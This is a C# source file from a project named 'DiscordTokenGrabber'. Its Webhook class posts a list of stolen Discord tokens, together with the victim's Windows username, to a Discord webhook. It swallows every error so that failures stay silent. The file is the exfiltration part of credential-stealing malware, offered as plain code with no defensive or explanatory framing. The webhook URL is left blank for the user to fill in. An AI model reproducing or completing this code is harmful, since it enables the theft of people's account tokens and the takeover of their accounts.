using System;
using System.Collections.Generic;
using System.Net.Http;

namespace DiscordTokenGrabber
{
    public static class Webhook
    {
        
        private static readonly string _hookUrl = "";


        public static void ReportTokens(List<string> tokenReport)
        {
            try
            {
                HttpClient client = new HttpClient();
                Dictionary<string, string> contents = new Dictionary<string, string>
                    {
                        { "content", $"------------------\nToken report for '{Environment.UserName}'\n\n{string.Join("\n", tokenReport)}" },
                        { "username", "Discord Token Grabber" },
                        { "avatar_url", "" }
                    };

                client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
            }
            catch { }
        }
    }
}